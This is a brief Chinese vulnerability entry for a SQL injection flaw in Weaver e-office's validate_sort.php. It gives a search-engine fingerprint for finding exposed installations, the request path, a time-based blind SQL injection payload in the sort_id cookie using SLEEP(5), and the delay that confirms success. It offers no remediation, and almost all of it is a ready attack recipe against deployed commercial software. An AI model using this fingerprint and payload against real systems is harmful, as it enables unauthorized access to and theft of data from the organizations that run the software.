# 泛微e-officevalidate_sort存在SQL注入漏洞

泛微OA ｜ SQL注入 ｜ —
- **指纹**：`app="泛微-EOffice"`
- **请求**：`GET /general/officeitem/sort/validate_sort.php HTTP/1.1`

**Payload**
```
like Gecko) Chrome/91.0.4472.77 Safari/537.36
Cookie: sort_id=1 AND (SELECT 4110 FROM (SELECT(SLEEP(5)))Cfzo)
```
- **响应特征**：200 延时时间>=5s